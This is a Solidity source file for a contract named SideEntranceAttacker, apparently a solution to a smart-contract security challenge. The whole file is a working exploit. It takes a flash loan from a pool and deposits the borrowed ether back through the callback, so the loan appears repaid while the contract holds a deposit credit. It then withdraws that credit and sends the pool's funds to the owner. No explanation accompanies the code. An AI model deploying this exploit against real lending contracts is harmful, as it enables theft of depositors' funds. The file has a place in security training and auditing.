// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttacker {
    address payable public pool;
    address public owner;

    constructor(address payable _pool) {
        pool = _pool;
        owner = msg.sender;
    }

    function exploit(uint256 amount) external {

        IPool(pool).flashLoan(amount);

        IPool(pool).withdraw();

        payable(owner).transfer(address(this).balance);
    }

    function execute() external payable {
        IPool(pool).deposit{value: msg.value}();
    }

    receive() external payable {}
}
